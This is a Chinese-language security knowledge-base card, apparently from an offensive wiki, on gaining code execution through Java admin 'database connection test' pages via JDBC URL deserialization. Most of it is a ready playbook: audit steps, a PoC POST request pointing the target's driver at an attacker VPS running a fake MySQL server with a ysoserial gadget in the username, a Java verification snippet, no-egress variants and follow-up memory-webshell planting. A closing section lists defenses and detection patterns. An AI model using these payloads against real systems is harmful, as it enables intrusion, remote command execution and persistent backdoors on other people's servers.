---
id: web-java-deserialization-db-connection-test-page-jdbc-url-controlled
title: 后台的「数据库连接测试」页面把 URL/用户名/密码全部交给用户填：审计时按 type 分支找到 DriverManager.getConnection 入口，用伪 MySQL 服务端 + yso gadget 命名在用户名里回打反序列化
type: scenario
domain: web
path: web/java/deserialization
technique: db-connection-test-page-jdbc-url-deserialization
tags:
- java
- jdbc
- deserialization
- autodeserialize
- audit
- yso
- mysql-fake-server
- webshell
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W3
  verified_at: '2026-11-08T19:33:15+08:00'
  notes: 已对照原文核对；url=jdbc:mysql://...?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor、username=yso-CommonsBeanutils2-raw_cmd:calc.exe、password、MySQL5.x、type 分支选驱动、JSP 数据库连接测试页、JMG 内存马等要点与正文一致；本次核对未读取图片，仅依据正文；POST 路由与 %26 编码属整理补充的通用写法而非原文原话，原始请求报文与本地弹计算器结果出自截图未验证
url: /docs/web/java/deserialization/web-java-deserialization-db-connection-test-page-jdbc-url-controlled/
draft: false
kb_aliases:
- 数据库连接测试页 JDBC 反序列化
- 连接测试 URL 可控
- type 分支多驱动加载
- yso-CommonsBeanutils2-raw_cmd
- 伪 MySQL 服务端回打
- 后台连接测试 getshell
---

## 一句话结论

带「数据库连接测试/数据源配置」功能的后台是被低估的反序列化入口：审计时先找 `.do`/`.action` 里按 `type` 分支选择驱动、最终调用 `DriverManager.getConnection(url, user, password)` 的位置，只要这三项来自请求参数，就能把 URL 换成自己的 MySQL 地址并追加 `autoDeserialize=true` + `statementInterceptors=ServerStatusDiffInterceptor`，用伪 MySQL 服务端在握手/查询响应里返回序列化链，用户名写成 `yso-<gadget>-<命令>` 让伪服务端按名生成 payload，驱动 `readObject` 即命令执行；目标 classpath 有 commons-collections 时用 `CommonsBeanutils2` 链最稳。

## 原理

- **功能即原语**：连接测试页的业务目的就是「按用户输入连一个陌生数据库」，天然要求 URL/host/port/库名/账号/口令全部可控。开发往往只给它加了「后台登录」这一层，却没意识到它等价于把 `DriverManager.getConnection` 暴露成了可执行任意 JDBC URL 的接口。
- **`type` 分支暴露驱动选择**：代码常见写法是 `switch(type)` → 分别 `Class.forName("com.mysql.jdbc.Driver")` / Oracle / SQLServer 驱动再各自建连。审计时看到「一个下拉框决定驱动」的页面，就知道该点必然存在「用户可控 URL 进驱动」的路径。
- **驱动侧的开关**：`autoDeserialize=true` 让驱动对服务端返回的特定列做 Java 反序列化；`statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor`（5.x）或 `queryInterceptors=...ServerStatusDiffInterceptor`（8.x）使驱动在连接初始化阶段主动发 `SHOW SESSION STATUS`，把响应 value 交给 `readObject`。因此只要「能连上我的服务端」就够，不需要目标有任何反序列化接口。
- **gadget 由服务端选择**：伪 MySQL 服务端（MySQL_Fake_Server 一类）按「用户名/库名」里的标识决定回哪条链。`yso-CommonsBeanutils2-raw_cmd:calc.exe` 这种命名即「yso 工具的链名 + 执行方式 + 命令」，它把「选链」和「传命令」压缩进一个用户名参数，所以本类入口往往只需要用户名一个可控点。
- **为什么先本地验证**：在攻击机上起伪服务端 + 目标同版本驱动跑一次（原文本地弹计算器），确认链与驱动版本匹配，再打真实目标，避免把「链不匹配」误判成「无漏洞」。
- **落地后的自然延伸**：拿到命令执行后一般直接写内存马（JMG/哥斯拉一类）落 JSP/Servlet 型后门，避免依赖可写目录。

## 触发条件

- 后台（或有未授权访问的）存在「数据库连接测试/数据源配置/报表数据源」页面，URL、用户名、口令由请求参数传入。
- 服务端最终调用 `DriverManager.getConnection(url, user, pwd)` 或等价的数据源 `setUrl/setUsername` 后建连。
- classpath 含 MySQL Connector/J（5.x 或 8.x），且存在可用 gadget（commons-collections / commons-beanutils / c3p0 等）。
- 目标能出网访问攻击者的 MySQL 端口；否则需改用 `NamedPipeSocketFactory` 读本地管道等不出网手法。

## 利用步骤

1. 审计/黑盒定位入口：找 `.do`、`.action`、`/testConnection`、`/datasource/test` 一类路由，看是否有 `type`/`driver`/`url`/`username`/`password` 参数。
2. 反编译对应 Action/Controller，确认「参数 → setUrl/setUser → getConnection」的调用链，以及 `type` 到驱动的映射（决定用 5.x 还是 8.x 的参数名）。
3. 在攻击机起伪 MySQL 服务端，先本地复现：用目标同版本驱动写几行 Java 调 `DriverManager.getConnection(恶意 URL)`，确认能弹计算器。
4. 对真实目标提交：`url=jdbc:mysql://<vps>:<port>/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor`、`username=yso-CommonsBeanutils2-raw_cmd:<命令>`、`password` 任意。
5. 观察伪服务端日志：有回连即说明成功；若报驱动类不匹配，把 `statementInterceptors` 换成 `queryInterceptors` 并调整包名（`com.mysql.cj.jdbc.interceptors`）。
6. 命令执行确认后，注入内存马（JMG 生成 class → 落地加载），再用新后门做后续操作；内存马不依赖目录可写，适合「上传点已被修完」的场景。

## PoC

```text
POST /module/dbTest.do HTTP/1.1
Content-Type: application/x-www-form-urlencoded

type=mysql&url=jdbc:mysql://<vps>:3307/test?autoDeserialize=true%26statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&username=yso-CommonsBeanutils2-raw_cmd:calc.exe&password=123456
```

注意 URL 里的 `&` 必须整体做一次 URL 编码（`%26`），否则会被外层表单拆成独立参数，导致 `autoDeserialize`/`statementInterceptors` 丢失——这是该入口最常见的失败原因。

8.x 驱动的等价写法：

```text
url=jdbc:mysql://<vps>:3307/test?autoDeserialize=true%26queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
```

本地验证骨架：

```java
Class.forName("com.mysql.jdbc.Driver");
String url = "jdbc:mysql://127.0.0.1:3307/test?autoDeserialize=true"
           + "&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor";
DriverManager.getConnection(url, "yso-CommonsBeanutils2-raw_cmd:calc.exe", "123456");
```

## 变体与关联

- 参数名变体：`url`/`jdbcUrl`/`host`+`port`/`database`；有的把整串连接串放在一个 base64 字段里，或从上一个「保存数据源」接口写入配置后再由测试接口读取（此时先调保存接口写恶意 URL）。
- 链变体：`CommonsBeanutils2`/`CommonsCollectionsK1`/`c3p0`/`Jdk7u21`；按目标 classpath 选，伪服务端支持一条用户名换一条链。
- 无出网变体：`socketFactory=com.mysql.jdbc.NamedPipeSocketFactory&namedPipePath=/proc/self/fd/N` 读本地管道文件；或改用 H2 的 `INIT=RUNSCRIPT FROM 'http://...'`、HSQL 的 `CALL` 静态方法。
- 关联：与本库「直接可控 JDBC URL + autoDeserialize」的通用卡同原理，但本卡聚焦**入口发现**（`type` 分支 → `DriverManager.getConnection`）与**参数编码陷阱**（`%26`）、以及用用户名承载 gadget 的实战写法；与「Spring Actuator /env 改 spring.datasource.url」的区别是那条走配置写入 + refresh，本条直接向连接测试接口提交。
- 关联：落地后接内存马注入（JMG/哥斯拉），与「上传点被修完后改打内存马」的思路一致。

## 检测与防御

- 连接测试等「按用户输入建连」的功能，生产环境直接关闭或只允许白名单内的数据源 ID；绝不把 URL/host/port/账号口令当作请求参数。
- 驱动侧硬性关闭危险开关：`autoDeserialize=false`（默认）、禁用 `statementInterceptors`/`queryInterceptors` 由外部指定；升级到已修复版本并开启驱动的 allowLoadLocalInfile/allowUrlInLocalInfile 限制。
- classpath 侧清理不必要 gadget（commons-collections/commons-beanutils 老版本、c3p0），并对第三方组件做 SBOM 级管控。
- 出口侧限制应用服务器主动外连任意 3306/自定义端口；对「服务器向外网非常见 IP 的数据库端口发起连接」告警。
- 检测：请求参数里出现 `autoDeserialize`、`ServerStatusDiffInterceptor`、`statementInterceptors`、`queryInterceptors`、`NamedPipeSocketFactory`、`yso-`、`CommonsBeanutils` 等特征；数据库测试接口被非管理员账号调用；应用进程派生 `cmd.exe`/`/bin/sh` 子进程或出现 `System.loadLibrary`/字节码加载行为。
